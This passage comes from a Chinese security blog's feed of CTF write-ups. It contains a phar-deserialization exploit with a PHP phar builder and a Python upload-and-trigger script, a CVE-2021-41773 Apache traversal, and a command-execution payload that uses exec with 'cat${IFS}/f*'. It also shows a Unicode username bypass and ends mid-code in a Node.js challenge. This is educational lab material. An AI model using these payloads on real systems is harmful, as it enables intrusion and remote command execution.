class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后就是生成<code>phar</code>文件的<code>exp</code>，记得加上数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getflag</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>[] = <span class="keyword">new</span> getflag();</span><br><span class="line"><span class="variable">$a</span>[] = <span class="number">1</span>;</span><br><span class="line">@unlink(<span class="string">&quot;ars.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;ars.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/26/Qf61RKYUheHIJcO.png" alt="image.png"></p><p>然后把前面的<code>i:1</code>改成<code>i:0</code>之后改签名，改完之后，还是一样的利用脚本将<code>phar</code>文件写进文件就行，脚本如下，同样是抄的<code>Xenny</code>的，这里的脚本稍微有点不同就是因为先要用<code>zip</code>压缩一下再传：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xxx.nss.ctfer.vip:9080/&#x27;</span></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;./ars2.phar&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="comment">#打开文件</span></span><br><span class="line">file_out = gzip.<span class="built_in">open</span>(<span class="string">&quot;./ars2.zip&quot;</span>, <span class="string">&quot;wb+&quot;</span>)<span class="comment">#创建压缩文件对象</span></span><br><span class="line">file_out.writelines(file)</span><br><span class="line">file_out.close()</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">requests.post(</span><br><span class="line">    url,</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="number">0</span>: <span class="string">&#x27;O:1:&quot;A&quot;:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="number">0</span>: <span class="built_in">open</span>(<span class="string">&#x27;./ars2.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">) <span class="comment"># 写入</span></span><br><span class="line"></span><br><span class="line">res = requests.post(</span><br><span class="line">    url,</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="number">0</span>: <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="number">0</span>: <span class="string">&#x27;phar://tmp/a.txt&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">) <span class="comment"># 触发</span></span><br><span class="line"></span><br><span class="line">flag = re.<span class="built_in">compile</span>(<span class="string">&#x27;(NSSCTF\&#123;.+?\&#125;)&#x27;</span>).findall(res.text)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>这个我在本地复现是没有问题的，但我放到题目里发现怎么都打不通，检查之后发现它的<code>./tmp/a.txt</code>里面写不进东西了，不知道是个啥情况，不过能学到这个知识就挺好的了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;浅析GC回收机制与phar反序列化&quot;&gt;&lt;a href=&quot;#浅析GC回收机制与phar反序列化&quot; class=&quot;headerlink&quot; title=&quot;浅析GC回收机制与phar反序列化&quot;&gt;&lt;/a&gt;浅析GC回收机制与phar反序列化&lt;/h1&gt;&lt;p&gt;前段时间做&lt;code&gt;Xenny&lt;/code&gt;师傅的平台NSSCTF遇到了一道利用&lt;code&gt;GC&lt;/code&gt;回收机制，实现&lt;code&gt;phar&lt;/code&gt;反序列化的题，然后上周我们学校举办的校赛&lt;code&gt;GFCTF&lt;/code&gt;同样遇到了一道考点相似的题，那道题还要更难一点，要配合多种&lt;code&gt;filter&lt;/code&gt;过滤器来吃掉脏数据，不过原理是差不多的；后面会专门写一篇文章来解析那道题&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>WP篇之解析2021 GFCTF中的两道Web</title>
    <link href="https://arsenetang.github.io/2021/11/24/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%902021%20GFCTF%E4%B8%AD%E7%9A%84%E4%B8%A4%E9%81%93Web/"/>
    <id>https://arsenetang.github.io/2021/11/24/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%902021%20GFCTF%E4%B8%AD%E7%9A%84%E4%B8%A4%E9%81%93Web/</id>
    <published>2021-11-23T16:00:00.000Z</published>
    <updated>2021-11-24T09:27:31.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解析2021-GFCTF中的两道Web"><a href="#解析2021-GFCTF中的两道Web" class="headerlink" title="解析2021 GFCTF中的两道Web"></a>解析2021 GFCTF中的两道Web</h1><p>上周天我们学校的校赛<code>GFCTF(</code>原<code>SWPUCTF)12th</code>顺利举行，我觉得其中的两道Web题都挺有意思的，也是唯一有解的两道Web题，接下来就来聊聊这两道Web题，如果有想复现的师傅可以加qq来私聊找我要哈</p><span id="more"></span><h2 id="1-Baby-web"><a href="#1-Baby-web" class="headerlink" title="1.Baby_web"></a>1.Baby_web</h2><p>这道题考的是一个<code>Apache 2.4.49</code>的一个目录穿越的<code>cve</code>漏洞，利用这个漏洞看到源码然后代码审计</p><p>进去之后提示都在注释中：</p><p><img src="https://i.loli.net/2021/11/23/54wtTM8O3cW19IA.png" alt="image.png"></p><p>告诉我们源码在上层目录中，要我们想办法去看上层目录，我们知道网页根目录是<code>/var/www/html</code>，那么它的上层目录就是<code>/var/www</code>了，但正常情况下我们肯定是看不到上一层的，这时候我们先抓个包：</p><p><img src="https://i.loli.net/2021/11/23/MBblDfR65YcmJnW.png" alt="image.png"></p><p>看到<code>Apache</code>的版本号是2.4.49，相信很多小伙伴已经意识到前段时间爆出来的<code>CVE-2021-41773</code>了，就是说这个版本的<code>Apache</code>存在目录穿越漏洞，我们可以利用这个漏洞去获取源码，具体大家可以自行百度，这里只放出一张很有意思的图，就是用这种方法目录穿越</p><p><img src="https://i.loli.net/2021/11/23/81U9PLNntYCMxFi.png" alt="image.png"></p><p>然后得到源码，<code>index.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">&quot;main&quot;</span>,<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;Class.php&quot;</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> Temp(<span class="variable">$_POST</span>);<span class="comment">//入口</span></span><br><span class="line"><span class="variable">$temp</span>-&gt;display(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);<span class="comment">//进入display函数，后续进行文件包含</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>Class.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">defined(<span class="string">&#x27;main&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Temp</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$date</span>=[<span class="string">&#x27;version&#x27;</span>=&gt;<span class="string">&#x27;1.0&#x27;</span>,<span class="string">&#x27;img&#x27;</span>=&gt;<span class="string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$template</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;date = array_merge(<span class="keyword">$this</span>-&gt;date,<span class="variable">$data</span>); <span class="comment">//把一个或多个数组合并为一个数组</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;  <span class="comment">//需要进入这一层</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;template = str_replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;./template/admin/&#x27;</span>.<span class="variable">$template</span>);<span class="comment">//此目录下的任意文件</span></span><br><span class="line">            <span class="keyword">if</span>(!is_file(<span class="keyword">$this</span>-&gt;template))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template = <span class="string">&#x27;./template/index.html&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        extract(<span class="keyword">$this</span>-&gt;date);<span class="comment">//变量覆盖 将date数组覆盖掉</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;getTempName(<span class="variable">$template</span>,<span class="variable">$space</span>);<span class="comment">//让$template为index.html $space为admin</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;template);<span class="comment">//包含文件 需要包含./template/admin/index.html</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listdata</span>(<span class="params"><span class="variable">$_params</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$system</span> = [</span><br><span class="line">            <span class="string">&#x27;db&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;app&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;num&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sum&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;form&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;not_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;show_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;more&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;catid&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;field&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;order&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;space&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table_site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;total&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;join&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;on&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;return&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sbpage&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;module&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;urlrule&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagesize&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagefile&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$param</span> = <span class="variable">$where</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_params</span> = trim(<span class="variable">$_params</span>); <span class="comment">//去掉数组前后的空格</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$params</span> = explode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$_params</span>);</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$params</span>[<span class="number">0</span>], [<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;function&#x27;</span>])) &#123; <span class="comment">//以空格为分隔符将字符串分割为数组</span></span><br><span class="line">            <span class="variable">$params</span>[<span class="number">0</span>] = <span class="string">&#x27;action=&#x27;</span>.<span class="variable">$params</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123; <span class="comment">//遍历新生成的数组</span></span><br><span class="line">            <span class="variable">$var</span> = substr(<span class="variable">$t</span>, <span class="number">0</span>, strpos(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>)); <span class="comment">//var 为等号 前 的内容</span></span><br><span class="line">            <span class="variable">$val</span> = substr(<span class="variable">$t</span>, strpos(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>);<span class="comment">//val 为等号 后 的内容</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$var</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$system</span>[<span class="variable">$var</span>])) &#123; <span class="comment">//存在$system[$var]就重新赋值</span></span><br><span class="line">                <span class="variable">$system</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$param</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>; <span class="comment">//不存在就放在$param这个数组里</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// action</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$system</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span>  <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!function_exists(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$force</span> = <span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$force</span>) &#123;</span><br><span class="line">                    <span class="variable">$p</span> = [];</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$param</span> <span class="keyword">as</span> <span class="variable">$var</span> =&gt; <span class="variable">$t</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (strpos(<span class="variable">$var</span>, <span class="string">&#x27;param&#x27;</span>) === <span class="number">0</span>) &#123; <span class="comment">//判断键名是否以param开头</span></span><br><span class="line">                            <span class="variable">$n</span> = intval(substr(<span class="variable">$var</span>, <span class="number">5</span>)); <span class="comment">//intval()处理字符串直接返回0 </span></span><br><span class="line">                            <span class="variable">$p</span>[<span class="variable">$n</span>] = <span class="variable">$t</span>;        <span class="comment">//---------&gt;可以有 $p[0]=$t</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$rt</span> = call_user_func_array(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>); <span class="comment">//利用点</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$rt</span> = call_user_func(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;date);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>/template/admin/index.html</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;后台&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--&lt;img src=&quot;&lt;?php echo $img;?&gt;&quot;&gt;--&gt;</span><br><span class="line">&lt;div&gt;&lt;?php echo $this-&gt;listdata(&quot;action=list module=$mod&quot;);//$mod参数可控，用这里调用listdata</span><br><span class="line">    ?&gt;&lt;div&gt; </span><br><span class="line">    &lt;h6&gt;version: &lt;?php echo $version;?&gt;&lt;/h6&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>接下来就是代码审计工作了，慢慢审，理清它之间的逻辑，一切比较重要的地方我都在代码上做了注释，其实整个代码逻辑是非常清晰的：</p><p><code>GET -&gt; display -&gt; getTempName -&gt; include</code> </p><p><code>POST-&gt; array_merge -&gt; extract -&gt; 由于有include，通过$mod进入listdata -&gt; 变量覆盖生成新数组 -&gt; switch -&gt; call_user_func_array</code></p><p>所以说payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filename=index.html</span><br><span class="line">space=admin&amp;mod=1 action=function name=phpinfo</span><br></pre></td></tr></table></figure><p>发现在disable_function中禁掉了很多命令执行的函数，但漏掉了<code>exec</code>，所以说直接用<code>exec</code>将flag带出来就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filename=index.html</span><br><span class="line">space=admin&amp;mod=1 action=function name=exec param1=cat$&#123;IFS&#125;/f*&gt;/var/www/html/1</span><br></pre></td></tr></table></figure><p>然后访问1就好了</p><h2 id="2-ez-calc"><a href="#2-ez-calc" class="headerlink" title="2.ez_calc"></a>2.ez_calc</h2><p>一道很有意思的一道nodejs的题，也是我第一次接触nodejs，nodejs的语法和js好像，从中学到了挺多东西的</p><p>首先是一个登录框，提示不要爆破，首先查看页面源码</p><p><img src="https://i.loli.net/2021/11/24/GvJWNATKx4k2rQ9.png" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.body.username.toLowerCase() !== <span class="string">&#x27;admin&#x27;</span> </span><br><span class="line">&amp;&amp; req.body.username.toUpperCase() === <span class="string">&#x27;ADMIN&#x27;</span> </span><br><span class="line">&amp;&amp; req.body.passwd === <span class="string">&#x27;admin123&#x27;</span>)&#123;                <span class="comment">// 登录成功，设置 session</span></span><br></pre></td></tr></table></figure><p>可以看到密码为admin123，账户名小写后不能为admin，大写之后为ADMIN，看似永远为假的判断，绕过它却很简单，绕过这个的办法就是利用特殊字符，比如通过Character.toUpperCose()后，ı会为I，但它经过Charocter.toLowerCose()后并不是i，所以说账户名为admın，登录成功，登录之后继续查看源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> calc = req.body.calc;</span><br><span class="line"><span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//waf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; calc.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag || <span class="string">&quot;/(flc&#x27;\&quot;.&quot;</span>.split<span class="string">``</span>.some(<span class="function"><span class="params">v</span> =&gt;</span> v == calc[i])) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        calc = calc.slice(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + calc.slice(i + <span class="number">1</span>, calc.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//截取</span></span><br><span class="line">calc = calc.substring(<span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="comment">//去空</span></span><br><span class="line">calc = calc.replace(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">calc = calc.replace(<span class="regexp">/\\/g</span>, <span class="string">&quot;\\\\&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//小明的同学过滤了一些比较危险的东西</span></span><br><span class="line"><span class="keyword">while</span> (calc.indexOf(<span class="string">&quot;sh&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.replace(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.indexOf(<span 